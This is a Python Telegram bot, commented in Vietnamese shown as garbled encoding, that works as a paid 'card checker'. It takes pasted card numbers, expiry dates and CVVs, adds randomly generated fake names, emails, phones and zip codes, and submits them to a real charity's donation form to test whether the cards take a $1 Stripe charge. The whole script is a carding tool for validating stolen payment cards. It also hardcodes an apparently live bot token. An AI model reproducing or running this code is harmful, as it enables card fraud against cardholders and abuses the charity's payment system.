import logging
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import time
import os

# Thi·∫øt l·∫≠p logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thi·∫øt l·∫≠p nest_asyncio
nest_asyncio.apply()

# H√†m ƒë·ªÉ ƒë·ªçc v√† ghi credit t·ª´ file
def read_credits():
    if not os.path.exists("credits.txt"):
        return {}
    with open("credits.txt", "r") as f:
        lines = f.readlines()
    credits = {int(line.split(":")[0]): int(line.split(":")[1]) for line in lines}
    return credits

def write_credits(credits):
    with open("credits.txt", "w") as f:
        for user_id, credit in credits.items():
            f.write(f"{user_id}:{credit}\n")

# H√†m ƒë·ªÉ t·∫°o s·ªë ng·∫´u nhi√™n trong kho·∫£ng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# H√†m ƒë·ªÉ t·∫°o email ng·∫´u nhi√™n
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# H√†m ƒë·ªÉ t·∫°o t√™n ng·∫´u nhi√™n
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# H√†m ƒë·ªÉ t·∫°o m√£ b∆∞u ƒëi·ªán ng·∫´u nhi√™n
def random_zipcode():
    return random_num(1000, 9000)

# H√†m ƒë·ªÉ ki·ªÉm tra ƒë·ªãnh d·∫°ng th·∫ª v√† l·∫•y th√¥ng tin
def extract_card_info(card_input):
    # ƒêi·ªÅu ch·ªânh bi·ªÉu th·ª©c ch√≠nh quy ƒë·ªÉ nh·∫≠n c·∫£ nƒÉm 2 ho·∫∑c 4 ch·ªØ s·ªë
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        # N·∫øu ano ch·ªâ c√≥ 2 ch·ªØ s·ªë th√¨ th√™m "20" v√†o tr∆∞·ªõc
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# H√†m ƒë·ªÉ t√¨m th√¥ng b√°o l·ªói trong ph·∫£n h·ªìi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()  # Tr·∫£ v·ªÅ th√¥ng b√°o l·ªói
    return None

# H√†m x·ª≠ l√Ω l·ªánh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi bot thanh to√°n! Vui l√≤ng nh·∫≠p th√¥ng tin th·∫ª c·ªßa b·∫°n.")

# H√†m x·ª≠ l√Ω l·ªánh /user ƒë·ªÉ ki·ªÉm tra credit c·ªßa ng∆∞·ªùi d√πng
async def check_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = read_credits()
    credit = credits.get(user_id, 0)  # M·∫∑c ƒë·ªãnh 0 n·∫øu kh√¥ng c√≥ th√¥ng tin

    await update.message.reply_text(f"User ID: {user_id}\nCredit c√≤n l·∫°i: {credit}")

# H√†m ƒë·ªÉ th√™m credit cho ng∆∞·ªùi d√πng (d√†nh cho admin)
async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID c·ªßa admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán thao t√°c n√†y.")
        return

    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
    except (IndexError, ValueError):
        await update.message.reply_text("L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng: /credit <user_id> <credit>")
        return

    credits = read_credits()
    credits[user_id] = credits.get(user_id, 0) + amount
    write_credits(credits)

    await update.message.reply_text(f"ƒê√£ th√™m {amount} credit cho User ID: {user_id}.")

# H√†m x·ª≠ l√Ω l·ªánh /allow v√† /unallow
async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID c·ªßa admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán thao t√°c n√†y.")
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng: /allow <user_id>")
        return

    with open("allowed_users.txt", "a") as f:
        f.write(f"{user_id}\n")
    
    await update.message.reply_text(f"ƒê√£ cho ph√©p User ID: {user_id}.")

async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453  # ID c·ªßa admin
    if update.effective_user.id != admin_id:
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán thao t√°c n√†y.")
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng: /unallow <user_id>")
        return

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if user_id in allowed_users:
        allowed_users.remove(user_id)
        with open("allowed_users.txt", "w") as f:
            for user in allowed_users:
                f.write(f"{user}\n")
        await update.message.reply_text(f"ƒê√£ thu h·ªìi quy·ªÅn c·ªßa User ID: {user_id}.")
    else:
        await update.message.reply_text(f"User ID: {user_id} kh√¥ng c√≥ trong danh s√°ch cho ph√©p.")

# H√†m x·ª≠ l√Ω l·ªánh /proxy
async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        proxy = context.args[0]  # L·∫•y proxy theo ƒë·ªãnh d·∫°ng <ip>:<port>:<user>:<pass>
        await update.message.reply_text(f"Proxy ƒë√£ ƒë∆∞·ª£c thi·∫øt l·∫≠p: {proxy}")
    except IndexError:
        await update.message.reply_text("Vui l√≤ng cung c·∫•p proxy theo ƒë·ªãnh d·∫°ng: /proxy <ip>:<port>:<user>:<pass>")

# H√†m x·ª≠ l√Ω tin nh·∫Øn v√† tr·ª´ 5 credits sau m·ªói l·∫ßn ki·ªÉm tra
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    card_info = extract_card_info(user_input)

    if not card_info:
        return  # N·∫øu kh√¥ng c√≥ th√¥ng tin th·∫ª, bot s·∫Ω kh√¥ng tr·∫£ l·ªùi

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if update.effective_user.id not in allowed_users:
        await update.message.reply_text("Ng∆∞·ªùi D√πng Kh√¥ng ƒê∆∞·ª£c Ph√©p S·ª≠ D·ª•ng.")
        return

    # Tr·ª´ credit c·ªßa user
    credits = read_credits()
    if update.effective_user.id not in credits or credits[update.effective_user.id] < 5:
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ ƒë·ªß credit ƒë·ªÉ th·ª±c hi·ªán thao t√°c n√†y.")
        return
    credits[update.effective_user.id] -= 5
    write_credits(credits)

    cc, mes, ano, cvv = card_info

    # Ki·ªÉm tra th√°ng v√† nƒÉm h·∫øt h·∫°n
    current_year = int(datetime.now().strftime("%y"))  # L·∫•y 2 ch·ªØ s·ªë cu·ªëi nƒÉm hi·ªán t·∫°i
    current_full_year = int(datetime.now().strftime("%Y"))  # L·∫•y 4 ch·ªØ s·ªë nƒÉm hi·ªán t·∫°i
    current_month = int(datetime.now().strftime("%m"))  # L·∫•y th√°ng hi·ªán t·∫°i

    if len(ano) == 2:
        ano = "20" + ano  # Chuy·ªÉn ƒë·ªïi nƒÉm 2 ch·ªØ s·ªë th√†nh 4 ch·ªØ s·ªë
    ano = int(ano)

    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
        await update.message.reply_text("Th√°ng ho·∫∑c nƒÉm h·∫øt h·∫°n kh√¥ng h·ª£p l·ªá.")
        return

    phone = random_num(710000009, 900000009)  # T·∫°o s·ªë ƒëi·ªán tho·∫°i ng·∫´u nhi√™n
    email = random_email()  # T·∫°o email ng·∫´u nhi√™n
    name = random_name()  # T·∫°o t√™n ng·∫´u nhi√™n
    zipcode = random_zipcode()  # T·∫°o m√£ b∆∞u ƒëi·ªán ng·∫´u nhi√™n

    payload = {
        "tfa_1": name,
        "tfa_3": email,
        "tfa_4": phone,
        "tfa_21": name,
        "tfa_25": email,
        "tfa_27": phone,
        "tfa_5": cc,
        "tfa_6": mes,
        "tfa_7": ano,
        "tfa_8": cvv,
        "tfa_17": zipcode
    }

    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor", data=payload) as response:
            result_text = await response.text()

            end_time = time.time()
            elapsed_time = int(end_time - start_time)

            if "https://anglicaresa.com.au/success/" in result_text:
                await update.message.reply_text(
                    f"ùêÄùê©ùê©ùê´ùê®ùêØùêûùêù ‚úÖ\nùóñùóÆùóøùó±: {cc}|{mes}|{ano}|{cvv}\nùêÜùêöùê≠ùêûùê∞ùêöùê≤: Stripe Charge 1$\nùêëùêûùê¨ùê©ùê®ùêßùê¨ùêû: 1000: Approved\nùóßùó∂ùó∫ùó≤: {elapsed_time} ùê¨ùêûùêúùê®ùêßùêùùê¨"
                )
            else:
                error_message = extract_error_message(result_text)
                await update.message.reply_text(
                    f"Declined\nùóñùóÆùóøùó±: {cc}|{mes}|{ano}|{cvv}\nùêÜùêöùê≠ùêûùê∞ùêöùê≤: Stripe Charge 1$\nùêëùêûùê¨ùê©ùê®ùêßùê¨ùêû: {error_message or 'Unknown Error'}\nùóßùó∂ùó∫ùó≤: {elapsed_time} ùê¨ùêûùêúùê®ùêßùêùùê¨"
                )

# H√†m kh·ªüi t·∫°o bot
async def main():
    bot_token = "5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro"
    application = ApplicationBuilder().token(bot_token).build()

    # ƒêƒÉng k√Ω c√°c handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("credit", add_credit))
    application.add_handler(CommandHandler("user", check_user))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("unallow", unallow_user))
    application.add_handler(CommandHandler("proxy", set_proxy))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # G·ª≠i th√¥ng b√°o khi bot kh·ªüi ƒë·ªông
    logger.info("Bot ƒë√£ kh·ªüi ƒë·ªông")

    await application.start()
    await application.idle()

if __name__ == "__main__":
    asyncio.run(main())
